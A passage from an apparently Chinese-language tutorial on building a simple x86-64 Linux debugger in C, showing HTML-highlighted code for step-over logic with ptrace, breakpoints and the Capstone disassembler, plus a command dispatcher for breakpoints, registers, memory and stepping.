class="token function">dbg_step_over</span><span class="token punctuation">(</span>Debugger <span class="token operator">*</span>dbg<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token class-name">uint64_t</span> possible_pc_prev <span class="token operator">=</span> <span class="token function">get_pc</span><span class="token punctuation">(</span>dbg<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token comment">/*if this is breakpoint int 3 executed*/</span>    <span class="token class-name">uint64_t</span> possible_pc_currn <span class="token operator">=</span> possible_pc_prev <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>   <span class="token comment">/*if current instruction is breakpoint*/</span>    Breakpoint <span class="token operator">*</span>bp_prev <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    Breakpoint <span class="token operator">*</span>bp_currn <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span> data<span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span> next_addr<span class="token punctuation">;</span>    <span class="token comment">/*Maybe stoped for triggered a breakpoint*/</span>    <span class="token comment">/*previous instruction. Jump over a call but has triggered an breakpoint(0xcc)*/</span>    <span class="token function">HASH_FIND_PTR</span><span class="token punctuation">(</span>dbg<span class="token operator">-&gt;</span>d_brks<span class="token punctuation">,</span> <span class="token operator">&amp;</span>possible_pc_prev<span class="token punctuation">,</span> bp_prev<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>bp_prev <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> bp_prev<span class="token operator">-&gt;</span>b_enabled <span class="token operator">&amp;&amp;</span> bp_prev<span class="token operator">-&gt;</span>b_saved_data <span class="token operator">==</span> <span class="token number">0xE8</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token comment">/*call`s op code is 0xE8*/</span>        <span class="token comment">/*call instruction has been triggered*/</span>        <span class="token function">brk_disable</span><span class="token punctuation">(</span>bp_prev<span class="token punctuation">)</span><span class="token punctuation">;</span>        data <span class="token operator">=</span> <span class="token function">ptrace</span><span class="token punctuation">(</span>PTRACE_PEEKDATA<span class="token punctuation">,</span> dbg<span class="token operator">-&gt;</span>d_pid<span class="token punctuation">,</span> possible_pc_prev<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        csh handle <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        cs_insn<span class="token operator">*</span> insn<span class="token punctuation">;</span>        <span class="token class-name">size_t</span> count<span class="token punctuation">;</span>        <span class="token keyword">int</span> child_status<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">cs_open</span><span class="token punctuation">(</span>CS_ARCH_X86<span class="token punctuation">,</span> CS_MODE_64<span class="token punctuation">,</span> <span class="token operator">&amp;</span>handle<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[error]: Failed to initialize capstone engine!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token function">cs_disasm</span><span class="token punctuation">(</span>handle<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>data<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> possible_pc_prev<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>insn<span class="token punctuation">)</span><span class="token punctuation">;</span>        next_addr <span class="token operator">=</span> possible_pc_prev <span class="token operator">+</span> insn<span class="token operator">-&gt;</span>size<span class="token punctuation">;</span>        <span class="token function">dbg_set_breakpoint_at_address</span><span class="token punctuation">(</span>dbg<span class="token punctuation">,</span> next_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">set_pc</span><span class="token punctuation">(</span>dbg<span class="token punctuation">,</span> possible_pc_prev<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">continue_execution</span><span class="token punctuation">(</span>dbg<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment">/*Probably trigger another breakpoint in the function. So we need to disable it when stop*/</span>        <span class="token function">brk_enable</span><span class="token punctuation">(</span>bp_prev<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">HASH_FIND_PTR</span><span class="token punctuation">(</span>dbg<span class="token operator">-&gt;</span>d_brks<span class="token punctuation">,</span> <span class="token operator">&amp;</span>next_addr<span class="token punctuation">,</span> bp_prev<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>bp_prev <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> bp_prev<span class="token operator">-&gt;</span>b_enabled<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">brk_disable</span><span class="token punctuation">(</span>bp_prev<span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token comment">/*disable it*/</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">get_pc</span><span class="token punctuation">(</span>dbg<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> next_addr<span class="token punctuation">)</span><span class="token punctuation">{</span>             <span class="token comment">/*we stoped maybe because of triggering int3 below the call. So after continue we should check executed int3*/</span>            <span class="token function">set_pc</span><span class="token punctuation">(</span>dbg<span class="token punctuation">,</span> next_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">}</span>        <span class="token function">cs_free</span><span class="token punctuation">(</span>insn<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">cs_close</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>handle<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>bp_prev <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> bp_prev<span class="token operator">-&gt;</span>b_enabled <span class="token operator">&amp;&amp;</span> bp_prev<span class="token operator">-&gt;</span>b_saved_data <span class="token operator">!=</span> <span class="token number">0xE8</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment">/*normal instruction has been triggered. Just work as step in*/</span>        <span class="token function">dbg_step_in</span><span class="token punctuation">(</span>dbg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">/*stoped for PTRACE_SINGLESTEP*/</span>    <span class="token comment">/*current instruction. Jump over a call but there is 0xcc in current call instruction*/</span>    <span class="token function">HASH_FIND_PTR</span><span class="token punctuation">(</span>dbg<span class="token operator">-&gt;</span>d_brks<span class="token punctuation">,</span> <span class="token operator">&amp;</span>possible_pc_currn<span class="token punctuation">,</span> bp_currn<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>bp_currn <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> bp_currn<span class="token operator">-&gt;</span>b_enabled <span class="token operator">&amp;&amp;</span> bp_currn<span class="token operator">-&gt;</span>b_saved_data <span class="token operator">==</span> <span class="token number">0xE8</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment">/*current instruction is breakpoint and it`s a function invoking*/</span>        <span class="token function">brk_disable</span><span class="token punctuation">(</span>bp_currn<span class="token punctuation">)</span><span class="token punctuation">;</span>        data <span class="token operator">=</span> <span class="token function">ptrace</span><span class="token punctuation">(</span>PTRACE_PEEKDATA<span class="token punctuation">,</span> dbg<span class="token operator">-&gt;</span>d_pid<span class="token punctuation">,</span> possible_pc_currn<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        csh handle <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        cs_insn<span class="token operator">*</span> insn<span class="token punctuation">;</span>        <span class="token class-name">size_t</span> count<span class="token punctuation">;</span>        <span class="token keyword">int</span> child_status<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">cs_open</span><span class="token punctuation">(</span>CS_ARCH_X86<span class="token punctuation">,</span> CS_MODE_64<span class="token punctuation">,</span> <span class="token operator">&amp;</span>handle<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[error]: Failed to initialize capstone engine!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token function">cs_disasm</span><span class="token punctuation">(</span>handle<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>data<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> possible_pc_currn<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>insn<span class="token punctuation">)</span><span class="token punctuation">;</span>        next_addr <span class="token operator">=</span> possible_pc_currn <span class="token operator">+</span> insn<span class="token operator">-&gt;</span>size<span class="token punctuation">;</span>        <span class="token function">dbg_set_breakpoint_at_address</span><span class="token punctuation">(</span>dbg<span class="token punctuation">,</span> next_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">continue_execution</span><span class="token punctuation">(</span>dbg<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment">/*Probably trigger another breakpoint in the function. So we need to disable it when stop*/</span>        <span class="token function">brk_enable</span><span class="token punctuation">(</span>bp_currn<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">HASH_FIND_PTR</span><span class="token punctuation">(</span>dbg<span class="token operator">-&gt;</span>d_brks<span class="token punctuation">,</span> <span class="token operator">&amp;</span>next_addr<span class="token punctuation">,</span> bp_currn<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>bp_currn <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> bp_currn<span class="token operator">-&gt;</span>b_enabled<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">brk_disable</span><span class="token punctuation">(</span>bp_currn<span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token comment">/*disable it*/</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">get_pc</span><span class="token punctuation">(</span>dbg<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> next_addr<span class="token punctuation">)</span><span class="token punctuation">{</span>             <span class="token comment">/*we stoped maybe because of triggering int3 below the call. So after continue we should check executed int3*/</span>            <span class="token function">set_pc</span><span class="token punctuation">(</span>dbg<span class="token punctuation">,</span> next_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">}</span>        <span class="token function">cs_free</span><span class="token punctuation">(</span>insn<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">cs_close</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>handle<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>bp_currn <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> bp_currn<span class="token operator">-&gt;</span>b_enabled <span class="token operator">&amp;&amp;</span> bp_currn<span class="token operator">-&gt;</span>b_saved_data <span class="token operator">!=</span> <span class="token number">0xE8</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment">/*current instruction is a breakpoint but not a calling so we could just step over. Just work as step in */</span>        <span class="token function">dbg_step_in</span><span class="token punctuation">(</span>dbg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">show_UI</span><span class="token punctuation">(</span>dbg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token comment">/*not breakpoint in current invoking OR current normal instruction*/</span>    data <span class="token operator">=</span> <span class="token function">ptrace</span><span class="token punctuation">(</span>PTRACE_PEEKDATA<span class="token punctuation">,</span> dbg<span class="token operator">-&gt;</span>d_pid<span class="token punctuation">,</span> possible_pc_currn<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>data <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xE8</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                  <span class="token comment">/*Current instruction is a call.Set breakpoint at next instruction then continue*/</span>        csh handle <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        cs_insn<span class="token operator">*</span> insn<span class="token punctuation">;</span>        <span class="token class-name">size_t</span> count<span class="token punctuation">;</span>        <span class="token keyword">int</span> child_status<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">cs_open</span><span class="token punctuation">(</span>CS_ARCH_X86<span class="token punctuation">,</span> CS_MODE_64<span class="token punctuation">,</span> <span class="token operator">&amp;</span>handle<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[error]: Failed to initialize capstone engine!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token function">cs_disasm</span><span class="token punctuation">(</span>handle<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>data<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> possible_pc_currn<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>insn<span class="token punctuation">)</span><span class="token punctuation">;</span>        next_addr <span class="token operator">=</span> possible_pc_currn <span class="token operator">+</span> insn<span class="token operator">-&gt;</span>size<span class="token punctuation">;</span>        <span class="token function">dbg_set_breakpoint_at_address</span><span class="token punctuation">(</span>dbg<span class="token punctuation">,</span> next_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">continue_execution</span><span class="token punctuation">(</span>dbg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">HASH_FIND_PTR</span><span class="token punctuation">(</span>dbg<span class="token operator">-&gt;</span>d_brks<span class="token punctuation">,</span> <span class="token operator">&amp;</span>next_addr<span class="token punctuation">,</span> bp_currn<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>bp_currn <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> bp_currn<span class="token operator">-&gt;</span>b_enabled<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">brk_disable</span><span class="token punctuation">(</span>bp_currn<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">get_pc</span><span class="token punctuation">(</span>dbg<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> next_addr<span class="token punctuation">)</span><span class="token punctuation">{</span>             <span class="token comment">/*we stoped maybe because of triggering int3 below the call. So after continue we should check executed int3*/</span>            <span class="token function">set_pc</span><span class="token punctuation">(</span>dbg<span class="token punctuation">,</span> next_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">}</span>        <span class="token function">cs_free</span><span class="token punctuation">(</span>insn<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">cs_close</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>handle<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span>        <span class="token function">dbg_step_in</span><span class="token punctuation">(</span>dbg<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">/*Current instruction is normal. Just work as step in*/</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>到这里已经具备基本功能了，可以在<code>dbg_handle_command</code>中添加命令支持：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">dbg_handle_command</span><span class="token punctuation">(</span>Debugger <span class="token operator">*</span>dbg<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>cmd<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> <span class="token operator">*</span>lcmd <span class="token operator">=</span> <span class="token function">strdup</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> <span class="token operator">*</span>command<span class="token punctuation">;</span>    argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">strtok</span><span class="token punctuation">(</span>lcmd<span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">strtok</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    command <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>command <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_prefix</span><span class="token punctuation">(</span>command<span class="token punctuation">,</span> <span class="token string">"continue"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">continue_execution</span><span class="token punctuation">(</span>dbg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_prefix</span><span class="token punctuation">(</span>command<span class="token punctuation">,</span> <span class="token string">"quit"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">exit_debugger</span><span class="token punctuation">(</span>dbg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_prefix</span><span class="token punctuation">(</span>command<span class="token punctuation">,</span> <span class="token string">"break"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token comment">/*format: break/b [addr]*/</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>            <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"command break expect an address!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token function">dbg_set_breakpoint_at_address</span><span class="token punctuation">(</span>dbg<span class="token punctuation">,</span> <span class="token function">strtoul</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_prefix</span><span class="token punctuation">(</span>command<span class="token punctuation">,</span> <span class="token string">"register"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token comment">/*format: reg/r dump OR reg/r read/write [reg] value(hex)*/</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_prefix</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"dump"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token function">dbg_dump_all_regs</span><span class="token punctuation">(</span>dbg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_prefix</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"read"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"value:\t0x%08lx\n"</span><span class="token punctuation">,</span> <span class="token function">get_register_value</span><span class="token punctuation">(</span>dbg<span class="token operator">-&gt;</span>d_pid<span class="token punctuation">,</span> <span class="token function">get_register_from_name</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_prefix</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"write"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">set_register_value</span><span class="token punctuation">(</span>dbg<span class="token operator">-&gt;</span>d_pid<span class="token punctuation">,</span> <span class="token function">get_register_from_name</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">strtoul</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_prefix</span><span class="token punctuation">(</span>command<span class="token punctuation">,</span> <span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token comment">/*memory/m read [addr] OR write [addr] [value]*/</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_prefix</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"read"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"value:\t0x%08lx\n"</span><span class="token punctuation">,</span> <span class="token function">dbg_read_memory</span><span class="token punctuation">(</span>dbg<span class="token punctuation">,</span> <span class="token function">strtoul</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_prefix</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"write"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x%08lx\t-&gt;\t"</span><span class="token punctuation">,</span> <span class="token function">dbg_read_memory</span><span class="token punctuation">(</span>dbg<span class="token punctuation">,</span> <span class="token function">strtoul</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dbg_write_memory</span><span class="token punctuation">(</span>dbg<span class="token punctuation">,</span> <span class="token function">strtoul</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">strtoul</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x%08lx\n"</span><span class="token punctuation">,</span> <span class="token function">dbg_read_memory</span><span class="token punctuation">(</span>dbg<span class="token punctuation">,</span> <span class="token function">strtoul</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_prefix</span><span class="token punctuation">(</span>command<span class="token punctuation">,</span> <span class="token string">"step"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token comment">/*step in OR step over*/</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_prefix</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"in"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">dbg_step_in</span><span class="token punctuation">(</span>dbg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token 